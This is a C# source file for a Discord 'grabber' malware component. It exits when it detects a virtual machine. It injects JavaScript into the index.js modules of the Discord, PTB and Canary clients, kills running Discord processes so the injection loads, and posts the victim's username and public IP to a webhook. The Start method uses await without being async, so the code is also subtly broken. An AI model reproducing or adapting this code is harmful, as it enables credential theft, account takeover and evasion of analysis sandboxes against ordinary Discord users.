using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Threading.Tasks;

namespace Furious
{
    public class Grabber
    {
		public static bool CheckForVM()
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					{
						string text = managementBaseObject["Manufacturer"].ToString().ToLower();
						if ((text == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
						{
							return true;
						}
					}
				}
			}
			return false;
		}

		public static void Start(bool grabIP = false, bool checkForVM = false)
		{
			if (checkForVM)
			{
				if (CheckForVM())
					Environment.Exit(0);
			}
			else
            {
				InjectJS();
            }

			if (grabIP)
            {
				await SendIP();
            }

			CloseProcesses();
		}

		private static void InjectJS()
        {
			if (Directory.Exists(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discord"))
			{
				string[] discord = Directory.GetDirectories(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\Discord");
				foreach (string folderName in discord)
				{
					if (folderName.Contains("0."))
					{
						FileManagement.DiscordPath = folderName + @"\modules\discord_modules\index.js";
						FileManagement.CleanFile(FileManagement.DiscordPath);
						FileManagement.WriteDiscord(FileManagement.DiscordPath);
					}
				}
			}
			if (Directory.Exists(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discordptb"))
			{
				string[] ptb = Directory.GetDirectories(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discordptb");
				foreach (string folderName in ptb)
				{
					if (folderName.Contains("0."))
					{
						FileManagement.PTBPath = folderName + @"\modules\discord_modules\index.js";
						FileManagement.CleanFile(FileManagement.PTBPath);
						FileManagement.WriteDiscord(FileManagement.PTBPath);
					}
				}
			}
			if (Directory.Exists(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discordcanary"))
			{
				string[] canary = Directory.GetDirectories(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discordcanary");
				foreach (string folderName in canary)
				{
					if (folderName.Contains("0."))
					{
						FileManagement.CanaryPath = folderName + @"\modules\discord_modules\index.js";
						FileManagement.CleanFile(FileManagement.CanaryPath);
						FileManagement.WriteDiscord(FileManagement.CanaryPath);
					}
				}
			}
		}

		private static void CloseProcesses()
		{
			foreach (Process process in Process.GetProcesses())
			{
				if (process.ProcessName.ToLower().Contains("discord"))
				{
					process.Kill();
				}
			}
		}

		private static async Task<string> GrabIP()
		{
			return await new WebClient().DownloadStringTaskAsync("https://ipv4.icanhazip.com");
		}

		public static async Task<HttpResponseMessage> SendIP()
		{
			string hook = "webhook-here";
			
			HttpResponseMessage response = null;
			using (HttpClient httpClient = new HttpClient())
			{
				try
				{
					Dictionary<string, string> contents = new Dictionary<string, string>
					{
						{ "content", $"Data for '{ Environment.UserName }' @ { await Grabber.GrabIP() }" }
					};

                    response = await httpClient.PostAsync(hook, new FormUrlEncodedContent(contents));
				}
				catch (HttpRequestException ex)
				{
					Debug.WriteLine(ex.Message);
				}
			}
			return response;
		}
	}
}
